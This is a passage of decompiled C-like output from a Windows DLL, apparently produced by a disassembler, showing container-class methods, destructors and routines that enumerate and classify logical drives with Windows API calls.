    result = (char *)(*(int (__thiscall **)(_DWORD *, _DWORD, char *, char *))(*this + 84))(this, this[1], v3, a2);
    if ( v3 )
      return sub_10007ECD(v3);
  }
  return result;
}

//----- (10033A9A) --------------------------------------------------------
int __thiscall sub_10033A9A(int *this)
{
  char *v2; // eax
  int v3; // edx
  int result; // eax

  v2 = (char *)this[3];
  if ( v2 )
    sub_10007ECD(v2);
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10033AC1) --------------------------------------------------------
BOOL __thiscall sub_10033AC1(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10033ACC) --------------------------------------------------------
int __thiscall sub_10033ACC(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebp
  int v4; // ebx
  int v5; // eax

  v2 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 32 * a2;
    do
    {
      sub_100333C9(dword_10193B98, (LONG *)(v4 + this[3]));
      ++a2;
      v4 += 32;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v5 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}
// 10193B98: using guessed type LONG dword_10193B98[8];

//----- (10033B24) --------------------------------------------------------
unsigned int __thiscall sub_10033B24(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013713B);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 32;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (10033BA0) --------------------------------------------------------
unsigned int __thiscall sub_10033BA0(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // esi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int result; // eax
  int v11; // ebx
  unsigned int v12; // [esp+2Ch] [ebp+10h]

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (unsigned __int64)(unsigned int)v5 >> 27 != 0 ? -1 : 32 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0x20u,
      v5,
      (void (__thiscall *)(void *))sub_100067D5,
      (void (__thiscall *)(void *))sub_1000646B);
  }
  v12 = 0;
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v11 = 0;
    do
    {
      sub_100333C9((LONG *)(v11 + a3), (LONG *)(v11 + this[3]));
      ++v12;
      v11 += 32;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v12 < result );
  }
  return result;
}

//----- (10033C4A) --------------------------------------------------------
void __thiscall sub_10033C4A(_DWORD *this)
{
  int v2; // esi
  int v3; // eax
  int v4; // esi
  int v5; // eax
  int v6; // ecx
  int *v7; // eax
  LONG *v8; // esi
  LONG *v9; // esi
  char *v10; // [esp+10h] [ebp-1Ch]
  int v11; // [esp+14h] [ebp-18h]
  char *Block; // [esp+18h] [ebp-14h]
  LONG *v13; // [esp+1Ch] [ebp-10h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v10 = (char *)this[3];
    v6 = (unsigned __int64)(unsigned int)v11 >> 27 != 0 ? -1 : 32 * v11;
    v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
    if ( v7 )
    {
      v8 = v7 + 1;
      *v7 = v11;
      `eh vector constructor iterator'(
        v7 + 1,
        0x20u,
        v11,
        (void (__thiscall *)(void *))sub_100067D5,
        (void (__thiscall *)(void *))sub_1000646B);
      v13 = v8;
    }
    else
    {
      v13 = 0;
    }
    Block = 0;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v9 = v13;
      do
      {
        sub_100333C9((LONG *)((char *)v9 + v10 - (char *)v13), v9);
        ++Block;
        v9 += 8;
      }
      while ( (unsigned int)Block < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v13;
    if ( v10 )
      sub_10007ECD(v10);
    this[2] = v11;
  }
}

//----- (10033D49) --------------------------------------------------------
void __thiscall sub_10033D49(_DWORD *this)
{
  *this = &off_101036AC;
  sub_10013F22((int)(this + 5));
  sub_100338DC(this + 1);
  sub_10039F05(this);
}
// 101036AC: using guessed type int (__thiscall *off_101036AC)(void *Block, char);

//----- (10033D8C) --------------------------------------------------------
bool __thiscall sub_10033D8C(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  _DWORD *v4; // eax
  bool result; // al

  v3 = sub_10034145(a2, this);
  result = 0;
  if ( v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3);
    if ( sub_10032933(v4, a2) )
      return 1;
  }
  return result;
}

//----- (10033DCA) --------------------------------------------------------
char __thiscall sub_10033DCA(_DWORD *this, _DWORD *a2)
{
  int v3; // esi
  _DWORD *v4; // eax

  v3 = sub_10034145(a2, this);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    return 0;
  v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3);
  if ( !sub_10032933(v4, a2) )
    return 0;
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (10033E2C) --------------------------------------------------------
int __thiscall sub_10033E2C(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  _DWORD *v4; // eax
  int v5; // eax
  int v7; // [esp+8h] [ebp-4h]

  v2 = a2;
  v7 = sub_10034145(a2, this);
  if ( v7 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || (v4 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v7), !sub_10032933(v4, v2)) )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, v2, v7);
    v5 = this[5];
    HIBYTE(a2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 32))(this + 5, (char *)&a2 + 3, v7);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v7);
}

//----- (10033E96) --------------------------------------------------------
int __thiscall sub_10033E96(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // esi
  int v4; // eax
  _DWORD *v5; // edi
  _DWORD *v7; // eax

  v3 = a2;
  a2 = (_DWORD *)sub_10034145(a2, this);
  v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( a2 == (_DWORD *)v4
    || (v5 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, _DWORD *))(this[1] + 48))(this + 1, a2), !sub_10032933(v5, v3)) )
  {
    v7 = sub_1000E8EF(&a2);
    sub_100078FE((int)v7);
  }
  return (*(int (__thiscall **)(_DWORD *, _DWORD *))(this[5] + 48))(this + 5, a2);
}

//----- (10033F00) --------------------------------------------------------
_BYTE *__thiscall sub_10033F00(void *this, int a2, char *a3)
{
  char v3; // bl
  _BYTE *result; // eax

  v3 = *a3;
  result = (_BYTE *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  *result = v3;
  return result;
}

//----- (10033F16) --------------------------------------------------------
_DWORD *__thiscall sub_10033F16(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v3; // eax
  int v5; // [esp-8h] [ebp-28h]
  int v6; // [esp-4h] [ebp-24h]

  v2 = this + 1;
  *a2 = off_100FBF5C;
  *a2 = &off_10103650;
  a2[2] = 1;
  v6 = (*(int (__thiscall **)(_DWORD *))(this[1] + 4))(this + 1);
  v5 = v2[3];
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  sub_10033BA0(a2, v3, v5, v6);
  return a2;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103650: using guessed type int (__thiscall *off_10103650)(void *Block, char);

//----- (10033F70) --------------------------------------------------------
_DWORD *__thiscall sub_10033F70(_DWORD *this, _DWORD *a2)
{
  sub_10014490(this + 5, a2);
  return a2;
}

//----- (10033FA1) --------------------------------------------------------
void __thiscall sub_10033FA1(_DWORD *this)
{
  *this = &off_10103624;
  sub_10033D49(this + 1);
}
// 10103624: using guessed type int (__thiscall *off_10103624)(void *Block, char);

//----- (10033FC8) --------------------------------------------------------
int __thiscall sub_10033FC8(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (10033FD0) --------------------------------------------------------
BOOL __thiscall sub_10033FD0(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (10034002) --------------------------------------------------------
int __thiscall sub_10034002(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, a2);
  return a2;
}

//----- (10034033) --------------------------------------------------------
int __thiscall sub_10034033(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 36))(this + 1, a2);
  return a2;
}

//----- (10034064) --------------------------------------------------------
int __thiscall sub_10034064(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 56))(this + 1);
}

//----- (1003406C) --------------------------------------------------------
void __thiscall sub_1003406C(void **this)
{
  if ( !InterlockedDecrement((volatile LONG *)this[1]) )
  {
    if ( this[1] )
      j__free(this[1]);
    if ( *this )
      (**(void (__thiscall ***)(void *, int))*this)(*this, 1);
  }
}

//----- (100340B9) --------------------------------------------------------
void *__thiscall sub_100340B9(void *Block, char a2)
{
  sub_100333F8((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100340D5) --------------------------------------------------------
_DWORD *__thiscall sub_100340D5(_DWORD *Block, char a2)
{
  sub_1003373D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100340F1) --------------------------------------------------------
_DWORD *__thiscall sub_100340F1(_DWORD *Block, char a2)
{
  sub_100338DC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003410D) --------------------------------------------------------
_DWORD *__thiscall sub_1003410D(_DWORD *Block, char a2)
{
  sub_10033D49(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10034129) --------------------------------------------------------
_DWORD *__thiscall sub_10034129(_DWORD *Block, char a2)
{
  sub_10033FA1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10034145) --------------------------------------------------------
int __userpurge sub_10034145@<eax>(_DWORD *a1@<eax>, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v4; // ebx
  _DWORD *v5; // esi
  _DWORD *v6; // eax
  int v7; // eax
  int v9; // [esp+10h] [ebp-8h]
  int v10; // [esp+14h] [ebp-4h]

  v2 = a2;
  v9 = -1;
  v4 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a2 + 4))(a2) >> 1;
  v10 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  if ( v4 > -1 )
  {
    while ( v4 < v10 )
    {
      v5 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(v2[1] + 48))(v2 + 1, v4);
      if ( sub_10032933(a1, v5) )
        break;
      v6 = (_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a2[1] + 48))(a2 + 1, v4);
      if ( sub_10032967(v6, a1) )
      {
        v10 = v4;
        v7 = v4 + v9;
      }
      else
      {
        v9 = v4;
        v7 = v10 + v4 + 1;
      }
      v4 = v7 / 2;
      if ( v7 / 2 <= v9 )
        break;
      v2 = a2;
    }
  }
  if ( v4 == v9 )
    return v9 + 1;
  return v4;
}

//----- (100341E9) --------------------------------------------------------
_DWORD *__stdcall sub_100341E9(_DWORD *a1)
{
  unsigned int v1; // edi
  _DWORD *v2; // ebx
  int v3; // ecx
  unsigned int *v4; // eax

  *a1 = off_100FBF5C;
  v1 = 1;
  *a1 = &off_10103650;
  do
    v1 *= 2;
  while ( v1 < 0x10 );
  v2 = 0;
  a1[1] = 0;
  a1[2] = v1;
  v3 = (unsigned __int64)v1 >> 27 != 0 ? -1 : 32 * v1;
  v4 = (unsigned int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = v1;
    `eh vector constructor iterator'(
      v4 + 1,
      0x20u,
      v1,
      (void (__thiscall *)(void *))sub_100067D5,
      (void (__thiscall *)(void *))sub_1000646B);
  }
  a1[3] = v2;
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103650: using guessed type int (__thiscall *off_10103650)(void *Block, char);

//----- (10034274) --------------------------------------------------------
_DWORD *__stdcall sub_10034274(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 16);
  return a2;
}

//----- (100342A9) --------------------------------------------------------
_DWORD *__stdcall sub_100342A9(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 24);
  return a2;
}

//----- (100342DE) --------------------------------------------------------
LONG *__stdcall sub_100342DE(LONG *a1)
{
  *a1 = (LONG)&off_10103748;
  sub_1000D17D(a1 + 1, &word_10176978);
  sub_1000D17D(a1 + 3, &word_1017697C);
  sub_1000D17D(a1 + 5, &word_10176980);
  sub_10034406(a1, (int)&unk_10186B38);
  return a1;
}
// 10103748: using guessed type int (__thiscall *off_10103748)(void *Block, char);

//----- (10034343) --------------------------------------------------------
int *__thiscall sub_10034343(int *Block, char a2)
{
  sub_1003435F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003435F) --------------------------------------------------------
void __thiscall sub_1003435F(int *this)
{
  *this = (int)&off_10103748;
  sub_1000D3AD(this + 5);
  sub_1000D3AD(this + 3);
  sub_1000D3AD(this + 1);
}
// 10103748: using guessed type int (__thiscall *off_10103748)(void *Block, char);

//----- (100343A3) --------------------------------------------------------
LONG *__stdcall sub_100343A3(LONG *a1, int a2)
{
  *a1 = (LONG)&off_10103748;
  sub_1000D17D(a1 + 1, &word_10176984);
  sub_1000D17D(a1 + 3, &word_10176988);
  sub_1000D17D(a1 + 5, &word_1017698C);
  sub_10034406(a1, a2);
  return a1;
}
// 10103748: using guessed type int (__thiscall *off_10103748)(void *Block, char);

//----- (10034406) --------------------------------------------------------
void __thiscall sub_10034406(LONG *this, int a2)
{
  LONG *v3; // eax
  _DWORD *v4; // eax
  int *v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  LONG *v9; // [esp-8h] [ebp-64h] BYREF
  int *v10; // [esp-4h] [ebp-60h]
  int (__thiscall **v11)(void *, char); // [esp+10h] [ebp-4Ch] BYREF
  UINT DriveTypeW; // [esp+14h] [ebp-48h]
  int pExceptionObject[2]; // [esp+18h] [ebp-44h] BYREF
  int v14[2]; // [esp+20h] [ebp-3Ch] BYREF
  int v15[2]; // [esp+28h] [ebp-34h] BYREF
  int v16[2]; // [esp+30h] [ebp-2Ch] BYREF
  int v17[6]; // [esp+38h] [ebp-24h] BYREF
  int v18; // [esp+58h] [ebp-4h]

  pExceptionObject[0] = (int)(this + 1);
  sub_10001236((LONG *)(a2 + 4), this + 2);
  sub_10034633((int)this);
  if ( sub_1000E007((int)(this + 5), (int)&unk_10186B28) )
  {
    this[7] = 2;
    v3 = this + 6;
LABEL_11:
    sub_10001236(v3, this + 4);
    return;
  }
  if ( sub_10034A02(this) || sub_10034B52(this) )
  {
    v10 = v16;
    this[7] = 4;
    v4 = sub_10034C6A(this, v10);
    v18 = 0;
    sub_10001236(v4 + 1, this + 4);
    v18 = -1;
    sub_1000D3AD(v16);
    return;
  }
  DriveTypeW = GetDriveTypeW(*(LPCWSTR *)(this[6] + 12));
  switch ( DriveTypeW )
  {
    case 2u:
      v7 = sub_100513C8(v15, (int)(this + 5));
      v18 = 2;
      sub_10051163(v17, (int)v7);
      LOBYTE(v18) = 4;
      sub_1000D3AD(v15);
      v10 = v16;
      v9 = v17;
      this[7] = 3;
      v8 = sub_10051459(v9, v10);
      LOBYTE(v18) = 5;
      sub_10001236(v8 + 1, this + 4);
      LOBYTE(v18) = 4;
      sub_1000D3AD(v16);
      v18 = -1;
      sub_100511C9(v17);
      break;
    case 3u:
      v6 = sub_100513C8(v14, (int)(this + 5));
      v18 = 1;
      sub_10001236(v6 + 1, this + 4);
      v18 = -1;
      sub_1000D3AD(v14);
      this[7] = 0;
      break;
    case 4u:
      this[7] = 1;
      v3 = this + 6;
      goto LABEL_11;
    default:
      sub_10029BC2(DriveTypeW - 4);
      v10 = v5;
      v9 = v5;
      pExceptionObject[1] = (int)&v9;
      sub_1000728E(&v9, 0);
      v18 = -1;
      sub_1004F466((_DWORD *)dword_10182DE8, 205, pExceptionObject[0], DriveTypeW, (int)v9, (int)v10);
      sub_1000E7F7(&v11, 1, 0);
      v11 = &off_101033F4;
      v18 = 8;
      Concurrency::details::ThreadScheduler::ThreadScheduler(
        (Concurrency::details::ThreadScheduler *)pExceptionObject,
        (const struct Concurrency::SchedulerPolicy *)&v11);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVCacoolkbufhBtatiKygcAcoolkbuf_BurqUpfqufhkrx_wvnem__);
  }
}
// 100344E4: variable 'v5' is possibly undefined
// 101033F4: using guessed type int (__thiscall *off_101033F4)(void *Block, char);
// 10182DE8: using guessed type int dword_10182DE8;
// 10034406: using guessed type int var_24[6];

//----- (10034633) --------------------------------------------------------
void __usercall sub_10034633(int a1@<edi>)
{
  int v1; // eax
  _DWORD *v2; // eax
  int *v3; // ecx
  _DWORD *v4; // eax
  int v5[2]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+18h] [ebp-18h] BYREF
  unsigned int v7; // [esp+1Ch] [ebp-14h]
  int v8; // [esp+2Ch] [ebp-4h]

  v7 = 0;
  if ( sub_1000E007(a1 + 4, (int)&unk_10186B28) )
    v7 = sub_1000D687((int)&unk_10186B28);
  v1 = sub_1000DF11(v7, a1 + 4, (int)&unk_10186B30);
  if ( v1 == -1 )
  {
    sub_1000D17D(&v6, asc_10176990);
    v8 = 0;
    v2 = sub_1000D5FF(v5, a1 + 4, &v6);
    LOBYTE(v8) = 1;
    sub_10001236(v2 + 1, (LONG *)(a1 + 24));
    LOBYTE(v8) = 0;
    sub_1000D3AD(v5);
    v8 = -1;
    v3 = &v6;
  }
  else
  {
    v4 = sub_1000D836(v1 + 1, a1 + 4, v5, 0);
    v8 = 2;
    sub_10001236(v4 + 1, (LONG *)(a1 + 24));
    v8 = -1;
    v3 = v5;
  }
  sub_1000D3AD(v3);
}

//----- (100346EC) --------------------------------------------------------
_DWORD *__usercall sub_100346EC@<eax>(__int32 a1@<eax>, _DWORD *a2)
{
  sub_10034863(a1, a2, 3);
  return a2;
}

//----- (1003471B) --------------------------------------------------------
_DWORD *__usercall sub_1003471B@<eax>(__int32 a1@<eax>, _DWORD *a2)
{
  sub_10034863(a1, a2, 4);
  return a2;
}

//----- (1003474A) --------------------------------------------------------
_DWORD *__cdecl sub_1003474A(_DWORD *a1)
{
  int v1; // eax
  int v2; // eax
  void *v3; // eax
  LONG *v4; // eax
  _DWORD *v5; // eax
  _DWORD v7[4]; // [esp+10h] [ebp-44h] BYREF
  _DWORD v8[2]; // [esp+20h] [ebp-34h] BYREF
  int v9[2]; // [esp+28h] [ebp-2Ch] BYREF
  int v10[2]; // [esp+30h] [ebp-24h] BYREF
  void *v11[6]; // [esp+38h] [ebp-1Ch] BYREF
  int v12; // [esp+50h] [ebp-4h]

  sub_1002AB9A(a1);
  v12 = 0;
  v11[3] = (void *)1;
  sub_10050EF6(v7);
  v12 = 1;
  sub_10037CF0(v7, (int)v11);
  LOBYTE(v12) = 2;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v11[0] + 4))(v11[0]) )
  {
    v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)v11[0] + 12))(v11[0]);
    sub_100342A9(v1, v10);
    LOBYTE(v12) = 3;
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v11[0] + 12))(v11[0]);
    sub_10034274(v2, v9);
    LOBYTE(v12) = 4;
    if ( *(_DWORD *)(v10[1] + 28) && !*(_DWORD *)(v9[1] + 28) )
    {
      v3 = operator new(0x20u);
      v11[2] = v3;
      LOBYTE(v12) = 5;
      if ( v3 )
        v4 = sub_100343A3((LONG *)v3, (int)v10);
      else
        v4 = 0;
      LOBYTE(v12) = 4;
      v5 = sub_1000728E(v8, (int)v4);
      LOBYTE(v12) = 6;
      sub_10034F16(a1, (int)v5);
      LOBYTE(v12) = 4;
      sub_1000780D(v8);
    }
    LOBYTE(v12) = 3;
    sub_1000D3AD(v9);
    LOBYTE(v12) = 2;
    sub_1000D3AD(v10);
    sub_10042AAB((int)v11[0]);
  }
  LOBYTE(v12) = 1;
  sub_1003406C(v11);
  LOBYTE(v12) = 0;
  sub_10034D9E(v7);
  return a1;
}
// 1003474A: using guessed type _DWORD var_44[4];
// 1003474A: using guessed type _DWORD var_34[2];

//----- (10034863) --------------------------------------------------------
void __usercall sub_10034863(__int32 a1@<eax>, _DWORD *a2@<ecx>, int a3)
{
  int v4; // ecx
  _DWORD *v5; // eax
  WCHAR *i; // edi
  LONG *v7; // eax
  _DWORD *v8; // eax
  int v9; // [esp-8h] [ebp-26Ch] BYREF
  int v10; // [esp-4h] [ebp-268h]
  _DWORD v11[2]; // [esp+10h] [ebp-254h] BYREF
  int v12[2]; // [esp+18h] [ebp-24Ch] BYREF
  void *v13; // [esp+20h] [ebp-244h]
  WCHAR *v14; // [esp+24h] [ebp-240h]
  void *Block; // [esp+28h] [ebp-23Ch] BYREF
  int v16; // [esp+2Ch] [ebp-238h]
  WCHAR Buffer[266]; // [esp+30h] [ebp-234h] BYREF
  wchar_t String[14]; // [esp+244h] [ebp-20h] BYREF
  int v19; // [esp+260h] [ebp-4h]

  v13 = a2;
  sub_10029BC2(a1);
  sub_1002AB9A(a2);
  v19 = 0;
  v16 = 1;
  if ( !GetLogicalDriveStringsW(0x104u, Buffer) )
  {
    v10 = v4;
    v9 = v4;
    Block = &v9;
    sub_1000728E(&v9, 0);
    v19 = 0;
    sub_1004F7E6((_DWORD *)dword_10182DE8, 209, a3, v9, v10);
    v5 = sub_1000E7F7(&Block, 1, 0);
    v19 = 2;
    v10 = 176;
    sub_10007882((int)v5);
  }
  wcscpy(String, (const wchar_t *)&dword_10176994);
  for ( i = Buffer; ; i += 4 )
  {
    v14 = i;
    if ( !*i )
      break;
    if ( a3 == GetDriveTypeW(i) )
    {
      v19 = 3;
      String[0] = *i;
      Block = operator new(0x20u);
      LOBYTE(v19) = 4;
      if ( Block )
      {
        sub_1000D17D(v12, String);
        LOBYTE(v19) = 5;
        v16 |= 2u;
        v7 = sub_100343A3((LONG *)Block, (int)v12);
      }
      else
      {
        v7 = 0;
      }
      v19 = 6;
      v8 = sub_1000728E(v11, (int)v7);
      v19 = 7;
      sub_10034F16(v13, (int)v8);
      LOBYTE(v19) = 6;
      sub_1000780D(v11);
      v19 = 3;
      if ( (v16 & 2) != 0 )
      {
        v16 &= ~2u;
        sub_1000D3AD(v12);
      }
      v19 = 0;
    }
  }
  sub_1009FFCE();
}
// 100348B2: variable 'v4' is possibly undefined
// 10176994: using guessed type int dword_10176994;
// 10182DE8: using guessed type int dword_10182DE8;
// 10034863: using guessed type _DWORD var_254[2];

//----- (10034A02) --------------------------------------------------------
char __stdcall sub_10034A02(void *a1)
{
  LONG *v1; // eax
  const WCHAR *v2; // edi
  WCHAR *v3; // eax
  bool v4; // bl
  _DWORD *v5; // eax
  int v6; // ecx
  int v7; // eax
  int v8; // ecx
  int v9; // ecx
  int v11; // [esp-10h] [ebp-54h] BYREF
  int v12; // [esp-Ch] [ebp-50h]
  int v13; // [esp-8h] [ebp-4Ch] BYREF
  int v14; // [esp-4h] [ebp-48h]
  int v15[3]; // [esp+10h] [ebp-34h] BYREF
  LONG v16[2]; // [esp+1Ch] [ebp-28h] BYREF
  void *v17[2]; // [esp+24h] [ebp-20h] BYREF
  int v18[5]; // [esp+2Ch] [ebp-18h] BYREF
  int v19; // [esp+40h] [ebp-4h]

  v19 = 0;
  sub_1000D1D6(v16, 0x104u);
  LOBYTE(v19) = 1;
  v1 = sub_1000D836(2, (int)a1 + 20, v18, 0);
  LOBYTE(v19) = 2;
  v2 = *(const WCHAR **)(sub_1000D9B4(v1)[1] + 12);
  v3 = (WCHAR *)sub_1000D679(v16);
  v4 = QueryDosDeviceW(v2, v3, 0x104u) == 0;
  LOBYTE(v19) = 1;
  sub_1000D3AD(v18);
  if ( v4 )
  {
    v5 = sub_1000E9DF(v15, 1, 1);
    LOBYTE(v19) = 3;
    sub_1000A947(v5, 217);
  }
  sub_100185CD((void *)(dword_101842F4 + 140), (int)v17);
  LOBYTE(v19) = 4;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v17[0] + 4))(v17[0]) )
  {
    v14 = v6;
    v13 = v6;
    sub_1000D372(&v13, (int)v16);
    LOBYTE(v19) = 5;
    v7 = (*(int (__thiscall **)(void *))(*(_DWORD *)v17[0] + 12))(v17[0]);
    v12 = v8;
    v11 = v8;
    v18[1] = (int)&v11;
    sub_1000D372(&v11, v7);
    LOBYTE(v19) = 4;
    if ( sub_1002434A(v11, v12, v13, v14) )
    {
      LOBYTE(v19) = 1;
      sub_10007D7A(v17);
      LOBYTE(v19) = 0;
      sub_1000D3AD(v16);
      return 1;
    }
    sub_10021F56(v9, (int)v17[0]);
  }
  LOBYTE(v19) = 1;
  sub_10007D7A(v17);
  LOBYTE(v19) = 0;
  sub_1000D3AD(v16);
  return 0;
}
// 10034AB1: variable 'v6' is possibly undefined
// 10034ACE: variable 'v8' is possibly undefined
// 10034B0F: variable 'v9' is possibly undefined
// 101842F4: using guessed type int dword_101842F4;
// 10034A02: using guessed type LONG var_28[2];
// 10034A02: using guessed type int var_34[3];

//----- (10034B52) --------------------------------------------------------
char __stdcall sub_10034B52(void *a1)
{
  _DWORD *v1; // eax
  LONG *v2; // eax
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  int v6; // ecx
  int v8; // [esp-10h] [ebp-5Ch] BYREF
  int v9; // [esp-Ch] [ebp-58h]
  int v10; // [esp-8h] [ebp-54h] BYREF
  int v11; // [esp-4h] [ebp-50h]
  int v12[5]; // [esp+10h] [ebp-3Ch] BYREF
  int v13[2]; // [esp+24h] [ebp-28h] BYREF
  void *v14[2]; // [esp+2Ch] [ebp-20h] BYREF
  int v15[5]; // [esp+34h] [ebp-18h] BYREF
  int v16; // [esp+48h] [ebp-4h]

  v16 = 0;
  v1 = sub_100513C8(v15, (int)a1 + 20);
  LOBYTE(v16) = 1;
  v2 = sub_10051163(v12, (int)v1);
  LOBYTE(v16) = 2;
  sub_10051459(v2, v13);
  LOBYTE(v16) = 4;
  sub_100511C9(v12);
  LOBYTE(v16) = 5;
  sub_1000D3AD(v15);
  sub_100185CD((void *)(dword_101842F4 + 124), (int)v14);
  LOBYTE(v16) = 6;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v14[0] + 4))(v14[0]) )
  {
    v11 = v3;
    v10 = v3;
    sub_1000D372(&v10, (int)v13);
    LOBYTE(v16) = 7;
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)v14[0] + 12))(v14[0]);
    v9 = v5;
    v8 = v5;
    v15[1] = (int)&v8;
    sub_1000D372(&v8, v4);
    LOBYTE(v16) = 6;
    if ( sub_1002434A(v8, v9, v10, v11) )
    {
      LOBYTE(v16) = 5;
